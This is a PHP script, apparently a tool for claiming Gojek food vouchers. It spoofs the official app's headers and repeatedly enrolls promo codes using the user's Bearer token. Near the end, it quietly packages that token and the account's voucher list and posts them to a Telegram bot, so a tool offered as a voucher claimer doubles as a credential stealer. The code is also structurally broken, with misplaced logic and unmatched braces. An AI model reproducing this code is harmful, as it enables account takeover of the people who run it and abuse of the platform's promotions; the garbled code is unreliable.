<?php

function request($url, $token = null, $data = null, $pin = null, $otpsetpin = null, $uuid = null){

$header[] = "Host: api.gojekapi.com";
$header[] = "User-Agent: okhttp/3.10.0";
$header[] = "Accept: application/json";
$header[] = "Accept-Language: id-ID";
$header[] = "Content-Type: application/json; charset=UTF-8";
$header[] = "X-AppVersion: 3.30.2";
$header[] = "X-UniqueId: ".time()."57".mt_rand(1000,9999);
$header[] = "Connection: keep-alive";
$header[] = "X-User-Locale: id_ID";
$header[] = "X-Location: -2.975294,104.773317";
$header[] = "X-Location-Accuracy: 3.0";
if ($pin):
$header[] = "pin: $pin";
    endif;
if ($token):
$header[] = "Authorization: Bearer $token";
 echo "\n".color("nevy","MAU CLAIM VOUCHER ?: y/n ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===========(CLAIM MULAI)===========")."\n";
        sleep (10);
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
	      gocar:
        echo "\n".color("nevy","# CLAIM FOOD 35+30+25k");
        echo "\n".color("yellow","# TAPI BOHONG , WKWKWKWK ");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(15);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
        gofood:
        echo "\n".color("nevy","# CLAIM ULANG");
        echo "\n".color("yellow","SAMPE CROT");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(15);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("green","🔓▶️ Message: ".$message);
        echo "\n".color("nevy","# CLAIM LAGI GOFOOD 15+10+5k");
        echo "\n".color("yellow","# SABAR YA , DIKIT LAGI KOK BIAR CROT");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(5);
        }
        sleep(15);
        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520A"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("green","# Message: ".$messageboba09);
        sleep(3);
	
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        echo "\n".color("red","🎫▶️ Total voucher ".$total." : ");
        echo "\n".color("purple","                     1. ".$voucher1);
        echo "\n".color("yellow","                     2. ".$voucher2);
        echo "\n".color("blue","                     3. ".$voucher3);
        echo "\n".color("nevy","                     4. ".$voucher4);
        echo "\n".color("green","                     5. ".$voucher5);
        echo "\n".color("purple","                     6. ".$voucher6);
        echo "\n".color("yellow","                     7. ".$voucher7);
        echo "\n".color("blue","                     8. ".$voucher8);
        echo "\n".color("nevy","                     9. ".$voucher9);
        echo "\n".color("green","                     10. ".$voucher10);
	echo "\n".color("purple","                     11. ".$voucher11);
        echo "\n".color("yellow","                     12. ".$voucher12);
        echo "\n".color("blue","                     13. ".$voucher13);
        echo"\n";
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        $TOKEN  = ":";
	$chatid = "";
	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
	$method	= "sendMessage";
	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         }
//  }

// echo change()."\n";	
